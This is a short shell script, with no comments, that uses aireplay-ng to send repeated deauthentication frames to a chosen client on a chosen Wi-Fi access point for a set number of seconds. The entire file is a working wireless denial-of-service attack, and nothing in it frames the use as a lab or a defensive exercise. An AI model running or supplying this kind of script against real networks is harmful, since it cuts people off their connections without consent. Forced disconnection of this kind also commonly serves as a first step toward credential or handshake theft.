client="$1"
ap="$2"
countdown="$3"
interface="$4"
end=$((SECONDS+countdown))
echo $end
while [ $SECONDS -lt $end ]
do
    aireplay-ng -0 16 -a $ap -c $client $interface
done